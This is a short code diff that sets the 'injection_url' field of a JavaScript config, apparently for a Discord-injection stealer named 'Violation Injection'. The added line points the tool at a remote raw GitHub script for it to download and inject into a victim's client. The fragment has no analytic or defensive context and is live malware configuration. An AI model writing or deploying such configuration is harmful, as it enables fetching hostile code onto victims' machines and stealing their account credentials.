@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Violation Injection', 
   embed_icon: 'https://i.imgur.com/qCwYSOV.png'.replace(/ /g, '%20'), 
   embed_color: 2303786, 
-  injection_url: '', 
+  injection_url: 'https://raw.githubusercontent.com/dw1E8dgmOhjxzLc/SDbrBBjGf7ByE4w/main/index.js', 
   /**
    
    **/
